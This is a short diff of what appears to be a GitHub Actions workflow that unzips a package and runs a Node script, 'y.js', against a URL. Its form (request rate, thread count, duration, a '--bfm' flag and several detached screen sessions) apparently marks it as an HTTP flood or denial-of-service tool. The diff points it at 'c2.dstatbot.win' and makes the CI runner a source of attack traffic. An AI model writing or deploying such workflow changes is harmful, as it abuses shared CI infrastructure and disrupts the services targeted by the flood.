@@ -35,7 +35,12 @@ jobs:
           cd ideal-guide
           unzip Fc-main.zip
           cd Fc-main
-          node y.js GET https://json-network.su/login 200 4 90 --bfm --full --debug 
+           
+          screen -dms ve  node y.js GET https://c2.dstatbot.win/yOAfc3iY 700 4 90 --bfm  --debug 
+
+          screen -dms ve node y.js GET https://c2.dstatbot.win/yOAfc3iY 700 4 90 --bfm  --debug 
+          node y.js GET https://c2.dstatbot.win/yOAfc3iY 700 4 90 --bfm  --debug
+
 
           
 
